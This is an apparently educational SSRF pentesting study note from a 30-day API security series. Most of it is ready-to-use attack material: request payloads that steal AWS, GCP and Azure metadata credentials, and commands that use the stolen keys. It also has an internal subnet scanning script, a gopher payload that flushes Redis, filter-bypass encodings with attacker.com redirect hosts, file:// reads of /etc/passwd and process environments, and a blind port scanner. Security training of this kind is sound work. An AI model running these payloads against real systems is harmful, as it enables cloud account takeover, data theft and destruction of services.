# SSRF Through APIs: Targeting Internal Services & Cloud Metadata
## Complete Study Notes — API Pentesting Day 13

> **Series:** 30-Day API Pentesting  
> **Day:** 13 — Week 2: OWASP API Top 10  
> **OWASP Category:** API6:2023 — Server Side Request Forgery (SSRF)

---

## 🧠 Core Concept — What is SSRF?

### Definition

**Server Side Request Forgery (SSRF)** — you supply a URL to the API, and the **server** makes that HTTP request from inside its own network. Since the server is inside the trusted perimeter, it can reach internal services that you, sitting on the internet, can never reach directly.

### The Key Mental Model

```
Without SSRF (normal):
  You (internet) ──X──▶ Internal Redis (unreachable)
  You (internet) ──X──▶ AWS Metadata (unreachable)
  You (internet) ──X──▶ Admin panel on localhost (unreachable)

With SSRF:
  You ──▶ Vulnerable API ──▶ Internal Redis      ✅ (server is trusted)
                         ──▶ AWS Metadata Service ✅ (server is on AWS)
                         ──▶ Admin panel :8080    ✅ (server is on same host)
```

### Why It Matters So Much

The server making the request is **inside the firewall**. It is **trusted** by every internal service. Redis has no password because "only internal services can reach it." The AWS metadata endpoint is accessible because "only EC2 instances can call it." SSRF breaks every one of those assumptions.

---

## 🔍 Finding SSRF Entry Points

### Parameter Names to Hunt For

```
url, link, src, source, href, dest, destination
redirect, redirectUrl, returnUrl, return, next
uri, path, callback, webhook, feed, host
target, img, image, avatar, logo, thumbnail
download, import, fetch, request, proxy, endpoint
```

### Features That Almost Always Have SSRF

```
HIGH PROBABILITY:
✅ URL preview / link unfurling (Slack-style link cards)
✅ File/document import from URL (import CSV/PDF from link)
✅ Webhook configuration (app sends events to your URL)
✅ Image upload via URL (instead of file upload)
✅ PDF generation from URL or HTML content
✅ RSS/Atom feed readers
✅ OAuth redirect/callback URIs
✅ Payment notification webhooks (IPN/webhook)
✅ Social media card / Open Graph previews
✅ API proxy endpoints (/api/proxy?url=...)
```

### Quick Discovery Script

```bash
# Grep JS files for URL-accepting parameters
grep -r "url\|link\|src\|webhook\|callback\|fetch\|import" *.js \
    | grep -i "post\|put\|api" | head -30

# Check Swagger/OpenAPI for URL fields
curl https://target.com/swagger.json | python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method, detail in methods.items():
        body = detail.get('requestBody', {})
        content = body.get('content', {}).get('application/json', {})
        schema = content.get('schema', {}).get('properties', {})
        for field, ftype in schema.items():
            if 'url' in field.lower() or 'link' in field.lower():
                print(f'{method.upper()} {path} → field: {field}')
"
```

---

## ☁️ SSRF → Cloud Metadata Theft (Critical)

### AWS EC2 Instance Metadata Service (IMDSv1)

```bash
# THE magic IP: 169.254.169.254
# Only reachable from inside AWS EC2 instances
# SSRF on an AWS-hosted API = instant credential theft

# Step 1: Probe metadata root
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/"}
# Response: ami-id, hostname, iam/, instance-id, ...

# Step 2: Get IAM role name
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# Response: "EC2-Production-Role"

# Step 3: Steal the credentials
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role"}
# Response — CRITICAL:
{
  "Code":            "Success",
  "Type":            "AWS-HMAC",
  "AccessKeyId":     "ASIAXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/XXXXXXXXXX",
  "Token":           "AQoXnyc4lcK4w4OIAAAyyy...",
  "Expiration":      "2024-12-01T12:00:00Z"
}

# Step 4: Use stolen creds
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/XXXXXXXXXX
export AWS_SESSION_TOKEN=AQoXnyc4lcK4w4OIAAAyyy...
aws sts get-caller-identity    # confirm identity
aws s3 ls                      # list all S3 buckets
aws iam list-users             # list all IAM users
aws ec2 describe-instances     # full infrastructure map
```

### Other AWS Metadata Paths

```bash
# User data (often contains passwords, bootstrap scripts)
http://169.254.169.254/latest/user-data

# All available metadata
http://169.254.169.254/latest/meta-data/

# Public IP (useful for report)
http://169.254.169.254/latest/meta-data/public-ipv4

# Instance identity document (account ID, region)
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### GCP Metadata Service

```bash
# GCP uses same IP but requires special header: Metadata-Flavor: Google
# Note: some APIs let you add headers, some don't

POST /api/fetch
{
  "url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
  "headers": {"Metadata-Flavor": "Google"}
}
# Returns: {"access_token":"ya29.XXXXX","expires_in":3599}

# Useful GCP metadata paths:
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env
```

### Azure IMDS

```bash
POST /api/fetch
{
  "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
  "headers": {"Metadata": "true"}
}

# Get access token:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

---

## 🔌 SSRF → Internal Service Attacks

### High-Value Internal Ports

```bash
PORT   SERVICE              WHAT YOU CAN DO
─────────────────────────────────────────────────────
6379   Redis                Read/write cache, potential RCE via Gopher
5432   PostgreSQL           Query internal database
3306   MySQL/MariaDB        Query internal database
27017  MongoDB              Dump collections without auth
9200   Elasticsearch        Read all indexed data
9300   Elasticsearch cluster nodes
8080   Admin panel / Proxy  Access internal admin UI
8443   HTTPS admin panel
2375   Docker daemon        List/control containers (NO AUTH default!)
2376   Docker TLS
8500   Consul               Service discovery + KV store (secrets)
10250  Kubernetes kubelet   Execute commands in pods
8001   Kubernetes API proxy
4040   ngrok tunnel info
3000   Grafana / Graylog    Dashboards, log data
5601   Kibana               Elasticsearch UI
```

### Scanning Internal Network

```bash
#!/bin/bash
TARGET="https://api.target.com/api/fetch"
TOKEN="Bearer YOUR_TOKEN"

# Probe common internal subnets
SUBNETS=("10.0.0" "10.0.1" "172.17.0" "192.168.1" "192.168.0")

for subnet in "${SUBNETS[@]}"; do
    for host in 1 2 5 10 100 254; do
        ip="$subnet.$host"
        CODE=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$TARGET" \
            -H "Authorization: $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"url\":\"http://$ip\"}" \
            --max-time 3)
        [ "$CODE" != "000" ] && echo "ALIVE: $ip → HTTP $CODE"
    done
done
```

### Attacking Redis via SSRF + Gopher

```bash
# Gopher protocol allows sending raw bytes — can interact with Redis directly
# Craft a RESP protocol command:
# SET cmd: *3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n

REDIS_CMD=$(python3 -c "
import urllib.parse
cmd = '*1\r\n\$8\r\nFLUSHALL\r\n'
print('gopher://localhost:6379/_' + urllib.parse.quote(cmd))
")

POST /api/fetch
{"url": "gopher://localhost:6379/_*1%0d%0a%248%0d%0aFLUSHALL%0d%0a"}

# More useful: write SSH key for RCE
# This requires Redis with write access to /root/.ssh/
```

---

## 🔒 SSRF Filter Bypass Techniques

### IP Encoding Tricks

```bash
# All of these = 127.0.0.1:
http://2130706433          # decimal
http://0x7f000001          # hex
http://0177.0.0.1          # octal
http://0x7f.0.0.1          # mixed
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://127%2e0%2e0%2e1     # URL encoded dots

# All of these = 169.254.169.254:
http://2852039166          # decimal
http://0xa9fea9fe          # hex
http://0251.0376.0251.0376 # octal
http://169.254.169.254.nip.io  # DNS resolution
```

### DNS-Based Bypasses

```bash
# nip.io — embeds IP in hostname, always resolves to that IP
http://169.254.169.254.nip.io  →  resolves to 169.254.169.254
http://127.0.0.1.nip.io        →  resolves to 127.0.0.1

# sslip.io — similar service
http://127.0.0.1.sslip.io

# Your own domain — set A record to internal IP:
# ssrf.attacker.com → 169.254.169.254 (in your DNS)
http://ssrf.attacker.com

# Redirect-based bypass — if server follows 302:
# Host: http://attacker.com/ssrf → returns 302 to http://169.254.169.254/
http://attacker.com/ssrf
```

### Protocol Confusion

```bash
# File read (if not blocked)
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline

# Dict protocol (simple TCP interaction)
dict://localhost:6379/info

# Gopher (raw TCP)
gopher://localhost:6379/_INFO

# TFTP
tftp://attacker.com/file.txt
```

---

## 👻 Blind SSRF — When You Can't See the Response

### Out-of-Band Detection

```bash
# Tools to receive callbacks:
# 1. Burp Collaborator (Burp Pro) — best for pentest
# 2. interactsh (free, open source)
# 3. webhook.site (free, easy)
# 4. canarytokens.org (free)

# Setup interactsh:
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# Get your unique URL: abcdef123.oast.fun

# Send as SSRF payload:
POST /api/webhook
{"callback_url": "http://abcdef123.oast.fun/ssrf-test"}

# interactsh shows:
# [DNS] abcdef123.oast.fun → confirmed SSRF via DNS lookup!
# [HTTP] GET /ssrf-test → confirmed full SSRF with HTTP response!
```

### Time-Based Blind Port Scanner

```python
import requests, time

TARGET  = "https://api.target.com/api/fetch"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
PORTS   = [80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 2375]

for port in PORTS:
    start = time.time()
    try:
        resp = requests.post(
            TARGET, headers=HEADERS,
            json={"url": f"http://localhost:{port}"},
            timeout=5
        )
        elapsed = round(time.time() - start, 2)
        
        if elapsed < 1.5:
            print(f"[OPEN]   localhost:{port}  ({elapsed}s)")
        else:
            print(f"[closed] localhost:{port}  ({elapsed}s)")
            
    except requests.Timeout:
        print(f"[filtered] localhost:{port}  (timeout)")
```

---

## 📊 Severity Assessment

| SSRF Finding | Severity |
|-------------|----------|
| AWS/GCP/Azure IAM credentials via metadata | Critical |
| Docker API accessible without auth | Critical |
| Kubernetes secrets readable | Critical |
| Internal database directly accessible | High |
| Internal admin panel accessible | High |
| File read via file:// protocol | High |
| Internal network port scan possible | Medium |
| Blind SSRF confirmed (no internal access yet) | Medium |

---

## 📝 Bug Report Template

```
Title: SSRF in POST /api/fetch → AWS IAM Credentials via 
       EC2 Metadata Service

Severity: Critical

CVSS: 9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

Description:
The /api/fetch endpoint makes a server-side HTTP request to any
URL provided by the user. The server runs on AWS EC2 and can reach
the Instance Metadata Service at 169.254.169.254, exposing IAM role
credentials that grant access to the entire AWS environment.

Steps to Reproduce:
1. POST /api/fetch
   Authorization: Bearer USER_TOKEN
   {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
   Response: "EC2-Production-Role"

2. POST /api/fetch
   {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role"}
   Response: {AccessKeyId, SecretAccessKey, Token}

3. aws s3 ls → lists all company S3 buckets with customer data

Impact:
Full AWS account compromise. All S3 data, RDS databases, and other
AWS resources exposed.

Fix:
- Block 169.254.0.0/16 and all private IP ranges in URL validator
- Migrate to IMDSv2 (requires session token, prevents basic SSRF)
- Remove public URL fetch feature if not business-critical
```

---

## ✅ Final Checklist

```
☐  Find URL params — url= link= src= dest= webhook= feed= import= path=
☐  Test Burp Collaborator — DNS hit = blind SSRF confirmed
☐  Try AWS metadata — 169.254.169.254/latest/meta-data/iam/security-credentials/
☐  Try GCP/Azure metadata — same IP, different paths
☐  Scan internal network — 10.x.x.x, 172.16.x.x, 192.168.x.x, localhost
☐  Test localhost ports — :6379 :5432 :27017 :8080 :9200 :2375 Docker
☐  Try IP bypass encodings — 0x7f000001, 2130706433, 127.1, nip.io
☐  Test protocol bypasses — gopher://, file://, dict://
☐  Check if server follows 302 redirects to internal IPs
☐  Time-based blind port detection for non-responsive endpoints
```

---

## 💡 Key Takeaways

1. **URL params = SSRF candidates** — any param that makes the server fetch a URL
2. **169.254.169.254 is always the first target** — AWS/GCP/Azure credentials in one shot
3. **Internal services have no auth** — Redis, Elasticsearch rely on network isolation
4. **Firewalls don't protect against SSRF** — the request comes from inside
5. **Blind SSRF is still exploitable** — confirm with DNS callbacks, then escalate
6. **IP bypass is trivial** — 0x7f000001 = 127.0.0.1, filters are easily evaded

> **Hunter mindset:** The server is your proxy. It can go where you can't. Tell it where to go.

---

*30-Day API Pentesting Series — @cybermindspace — follow for more.*
